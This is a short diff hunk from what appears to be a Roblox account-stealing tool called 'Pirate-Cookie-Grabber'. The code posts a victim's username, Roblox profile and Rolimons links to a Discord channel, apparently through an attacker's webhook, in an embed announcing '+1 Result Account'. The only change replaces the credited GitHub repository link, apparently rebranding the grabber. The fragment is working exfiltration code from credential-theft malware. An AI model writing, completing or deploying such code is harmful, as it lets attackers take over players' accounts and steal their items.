@@ -119,7 +119,7 @@ discord.post(
         {
             "username": "BOT - Pirate 🍪",
             "title": "💸 +1 Result Account 🕯",
-            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
+            "description" : f"[Github Page](https://github.com/EZPV/updated-main) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
             "color" : 12452044,
             "fields": [
                 {"name": "Username", "value": username, "inline": True},
